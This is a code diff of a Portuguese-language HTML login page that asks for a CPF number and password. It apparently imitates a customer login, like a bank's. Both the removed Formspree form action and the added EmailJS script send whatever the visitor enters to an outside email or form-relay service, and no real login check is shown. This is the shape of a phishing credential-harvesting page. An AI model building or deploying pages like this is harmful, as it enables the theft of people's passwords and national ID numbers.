@@ -9,15 +9,15 @@
 <body>
     <img src="new-logo-white.svg" alt="Logo">
     
-    <form action="https://formspree.io/f/movqlakv" method="POST">
+    <form id="login-form">
         <b><p>Faça Seu Login</p></b>
         
         <label for="cpf">CPF
-            <input type="text" name="cpf" id="cpf">
+            <input type="text" name="cpf" id="cpf" required>
         </label>
         
         <label for="password">SENHA
-            <input type="password" name="password" id="password">
+            <input type="password" name="password" id="password" required>
         </label>
         
         <button type="submit">Enviar</button>
@@ -25,5 +25,27 @@
 
     <a href="#">Esqueci a Senha > </a>
     <a href="#">Ainda não sou cliente > </a>
+
+    <!-- Adicionando o Script do EmailJS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Inicializa o EmailJS com seu user_id
+        emailjs.init("jVdn1GUkCc7Ji-EPk"); // Substitua pelo seu user_id do EmailJS
+
+        // Função para enviar o formulário via EmailJS
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita o envio normal do formulário
+
+            // Envia o formulário para o EmailJS
+            emailjs.sendForm("service_q4yc9r6", "YOUR_TEMPLATE_ID", this)
+                .then(function(response) {
+                    alert("Mensagem enviada com sucesso!");
+                }, function(error) {
+                    alert("Falha ao enviar a mensagem.");
+                });
+        });
+    </script>
+
 </body>
 </html>
+
